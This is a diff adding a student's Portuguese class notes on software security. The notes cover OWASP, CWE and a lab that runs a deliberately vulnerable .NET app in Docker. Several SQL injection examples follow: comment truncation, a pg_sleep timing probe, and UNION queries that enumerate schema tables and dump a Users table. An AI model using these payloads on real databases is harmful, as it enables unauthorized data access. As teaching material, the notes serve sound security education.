@@ -1,0 +1,48 @@
+Aula 2109
+	
+   SEGURANÇA NA ENGENHARIA DE SOFTWARE
+ - Open Web Application Security Project (OWASP), é uma organização internacional sem fins lucrativos dedica a segurança de aplicativos web;
+ - Common Weakness Enumeration (Enumeração de Fraquezas Comuns, ou CWE na sigla e inglês). Trata-se de um sitema para categorizar falhas 
+   de segurança de software, focando em defeitos de implementação que podem levar vulnerabilidades;
+ 
+   INJECTION
+ - Quando eu crio uma tabela no banco de dados, o banco cria uma tabela interna com as informações e código que eu pedi para ser criado;
+ 
+ Para essa aula, já criou um sistema em dotnet que é como se fosse uma cadastro de produto. No momento, essa aplicação tem só uma funcionalidade
+ e ela tem um problema de segurança nessa funcionalidade.
+ Vamos subir esse sistema usando Docker:
+ 
+ 1. clonei o repositorio do professor
+ 2. coloquei na minha pasta
+ 3. abri o local da pasta e no explorador dentro da pasta eu apaguei o que estava escrito e digitei cmd para abrir já dentro da pasta
+ 4. com o cmd aberto eu digitei "code ." e apertei tab para ele procurar pelo projeto, com o projeto selecionado eu apertei enter para ele abrir o projeto no vscode.
+ 5. iniciar o servico do Docker
+ 6. iniciar o Docker Service
+ 7. Abrir no vscode o terminal, entrar na pasta misc e digitar "docker compose up" para baixar a imagem
+ 8. apos baixar a imagem, podemos acessar localhost:8080
+ 9. Acessamos a pagina inserindo as informações
+ 10. Ao lado esquerdo entrar na parte "Command SQL"
+ 11. E inserir os comendos ali do banco:
+ - exemplo 1: SELECT * FROM "Product" WHERE "Name" like '%Ham'--%'
+ - exemplo 2: SELECT * FROM "Product" WHERE "Name" like 'mer%'--%'
+ - exemplo 3: SELECT * FROM "Product" WHERE "Name" like 'mer%'; SELECT pg_sleep(2)--%';
+ - exemplo 4: SELECT * FROM "Product" WHERE "Name" like '%mer%'
+			  UNION
+			  SELECT '1', '2', '3';--%';
+ - exemplo 5: SELECT table_name FROM information_schema.tables WHERE table_schema='public'AND table_type='BASE TABLE';
+ - exemplo 6: SELECT * FROM "Product" WHERE "Name" like '%mer%'
+			  UNION
+			  SELECT table_name, table_schema, ''
+			  FROM information_schema.tables 
+			  WHERE table_schema='public'
+			  AND table_type='BASE TABLE'; 
+ - exemplo 7: SELECT * FROM "Product" WHERE "Name" like '%mer%'
+			  UNION
+			  SELECT * FROM "Users"
+			  UNION
+			  SELECT table_name, table_schema, ''
+			  FROM information_schema.tables 
+			  WHERE table_schema='public'
+			  AND table_type='BASE TABLE';
+			  
+	Como pesquisar comandos para executar sql no c#
